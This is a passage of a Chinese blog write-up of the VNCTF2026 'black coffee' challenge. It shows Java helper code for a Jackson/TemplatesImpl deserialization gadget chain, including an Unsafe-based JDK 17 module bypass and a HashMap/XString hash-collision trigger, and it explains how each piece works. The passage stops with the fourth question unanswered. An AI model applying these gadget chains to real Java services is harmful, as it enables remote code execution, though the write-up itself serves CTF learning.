class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">        ctClass.removeMethod(writeReplace);</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">        ctClass.toClass(classLoader, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取进行了动态代理的templatesImpl，保证触发getOutputProperties</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getPOJONodeStableProxy</span><span class="params">(Object templatesImpl)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);</span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">        advisedSupport.setTarget(templatesImpl);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) cons.newInstance(advisedSupport);</span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(clazz.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, handler);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Unsafe <span class="title function_">getUnsafe</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">unsafeClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">unsafeField</span> <span class="operator">=</span> unsafeClass.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        unsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) unsafeField.get(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> unsafe;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bypassModule</span><span class="params">(Class clazz)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> getUnsafe();</span><br><span class="line">        <span class="type">long</span> <span class="variable">offset</span> <span class="operator">=</span> unsafe.objectFieldOffset(clazz.getClass().getDeclaredField(<span class="string">&quot;module&quot;</span>));</span><br><span class="line">        unsafe.putObject(clazz, offset, Object.class.getModule());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//HashMap+XString触发toString</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">get_HashMap_XString</span><span class="params">(Object obj)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">xString</span> <span class="operator">=</span> createWithoutConstructor(Class.forName(<span class="string">&quot;com.sun.org.apache.xpath.internal.objects.XString&quot;</span>));</span><br><span class="line">        setFieldValue(xString,<span class="string">&quot;m_obj&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map1.put(<span class="string">&quot;yy&quot;</span>, xString);</span><br><span class="line">        map1.put(<span class="string">&quot;zZ&quot;</span>,obj);</span><br><span class="line">        map2.put(<span class="string">&quot;zZ&quot;</span>, xString);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map3.put(map1,<span class="number">1</span>);</span><br><span class="line">        map3.put(map2,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        map2.put(<span class="string">&quot;yy&quot;</span>, obj);</span><br><span class="line">        <span class="keyword">return</span> map3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//获取并设置类的字段</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldname, Object value)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldname);</span><br><span class="line">            <span class="keyword">if</span> (field == <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;field &quot;</span> + fieldname + <span class="string">&quot; not found&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            field.set(obj, value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//反射获取类字段</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(Class clazz,String fieldName)</span>&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (NoSuchFieldException e)&#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)&#123;</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/VNCTF/image-20260308141934973.png" alt="image-20260308141934973"></p>
+<h1 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h1><p>在官方wp中作者提出了几个思考的问题</p>
+<ol>
+<li><p>TemplatesImpl 为什么要套一层 JDKDynamicProxy</p>
+</li>
+<li><p>HashMap 构造的时候，yy zZ 这两个键有什么特殊作用吗</p>
+</li>
+<li><p>仓库里面有个 Util17，他的静态代码块里有个 bypassModule，尝试把这个静态代码块注释掉，看看会发生什么</p>
+</li>
+<li><p>getPOJONode 里面有个 removeMethod 的操作，作用是什么？注释掉看看会发生什么？</p>
+</li>
+</ol>
+<p>一一解答一下</p>
+<ul>
+<li>第一个问题：<a target="_blank" rel="noopener" href="http://localhost:4000/2025/12/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#TemplatesImpl%E9%93%BE%E5%AD%90%E7%9A%84%E4%B8%8D%E7%A8%B3%E5%AE%9A%E6%80%A7">http://localhost:4000/2025/12/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#TemplatesImpl%E9%93%BE%E5%AD%90%E7%9A%84%E4%B8%8D%E7%A8%B3%E5%AE%9A%E6%80%A7</a></li>
+<li>第二个问题：</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HashMap#readObject() -&gt; XString#equals() -&gt; 任意调#toString() </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//HashMap+XString触发toString</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">get_HashMap_XString</span><span class="params">(Object obj)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">xString</span> <span class="operator">=</span> createWithoutConstructor(Class.forName(<span class="string">&quot;com.sun.org.apache.xpath.internal.objects.XString&quot;</span>));</span><br><span class="line">    setFieldValue(xString,<span class="string">&quot;m_obj&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    map1.put(<span class="string">&quot;yy&quot;</span>, xString);</span><br><span class="line">    map1.put(<span class="string">&quot;zZ&quot;</span>,obj);</span><br><span class="line">    map2.put(<span class="string">&quot;zZ&quot;</span>, xString);</span><br><span class="line">    <span class="type">HashMap</span> <span class="variable">map3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    map3.put(map1,<span class="number">1</span>);</span><br><span class="line">    map3.put(map2,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    map2.put(<span class="string">&quot;yy&quot;</span>, obj);</span><br><span class="line">    <span class="keyword">return</span> map3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行完这个函数后的属性赋值是这样的</p>
+<p><img src="/../image/achieve/202411/VNCTF/image-20260308145438380.png" alt="image-20260308145438380"></p>
+<p>看到HashMap#readObject方法</p>
+<p><img src="/../image/achieve/202411/VNCTF/image-20260308150425360.png" alt="image-20260308150425360"></p>
+<p>这里会循环反序列化HashMap中的键和值，随后调用putVal重新存入HashMap中</p>
+<p>根据上面的map3，会先操作map2的第一个键值对<code>&#123;&quot;zZ&quot;:xString对象&#125;</code>，但是这里的话是直接存进新的HashMap中</p>
+<p>然后就是第二个键值对<code>&#123;&quot;yy&quot;:obj对象&#125;</code>，这里的话会从table中取出之前的第一个键值对赋值为p（可能理解有误）</p>
+<p>那么此时就是关键点</p>
+<p><img src="/../image/achieve/202411/VNCTF/image-20260308144639220.png" alt="image-20260308144639220"></p>
+<p>因为在java中逻辑运算符的优先级是从左到右的，所以这个if中的<code>p.hash == hash</code>是需要满足才能进入后面<code>key.equals(k)</code>的逻辑</p>
+<p>根据哈希碰撞可以得出，yy和zZ的哈希值的相同的，所以这里能满足条件</p>
+<p>在将map2的两个键值对和map1的两个键值对存进去后，他还会存放最外层的键值对</p>
+<p><img src="/../image/achieve/202411/VNCTF/image-20260308155032340.png" alt="image-20260308155032340"></p>
+<p>随后因为key是hashMap，所以会调用到其父类的equals方法，里面又会循环比较键值对</p>
+<p><img src="/../image/achieve/202411/VNCTF/image-20260308155250821.png" alt="image-20260308155250821"></p>
+<p>这里的话就能调用到<code>XString#equals(java.lang.Object)</code>了</p>
+<p>这是链子的大致流程，那么其实我们也就可以知道yy和zZ主要是为了满足前面的<code>p.hash==hash</code>而做的一个哈希碰撞绕过</p>
+<ul>
+<li>第三个问题：</li>
+</ul>
+<p><a href="https://wanth3f1ag.top/2026/02/01/Java%E4%B9%8BJDK17%E5%BC%BA%E5%B0%81%E8%A3%85-%E9%AB%98%E7%89%88%E6%9C%ACJDK%E5%8F%8D%E5%B0%84%E8%B0%83%E7%94%A8/">https://wanth3f1ag.top/2026/02/01/Java%E4%B9%8BJDK17%E5%BC%BA%E5%B0%81%E8%A3%85-%E9%AB%98%E7%89%88%E6%9C%ACJDK%E5%8F%8D%E5%B0%84%E8%B0%83%E7%94%A8/</a></p>
+<p>其实就是用Unsafe修改类所属module，这样在这个类中调用setAccessible的时候就能绕过高版本的限制</p>
+<ul>
+<li>第四个问题：</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+	
+	<div>
+	  
+		
+<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+	  
+	</div>
+
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>wanTh3flag
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://wanth3f1ag.top/2026/03/08/VNCTF2026-black-coffee/" title="VNCTF2026 black coffee">https://wanth3f1ag.top/2026/03/08/VNCTF2026-black-coffee/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/javasec/" rel="tag"># javasec</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/03/06/2024CISCN%E5%9B%BD%E8%B5%9Bweb%E6%B5%AE%E7%8E%B0/" rel="prev" title="2024CISCN国赛web浮现">
+                  <i class="fa fa-angle-left"></i> 2024CISCN国赛web浮现
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2024 – 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">wanTh3flag</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">3.7m</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">55:20</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
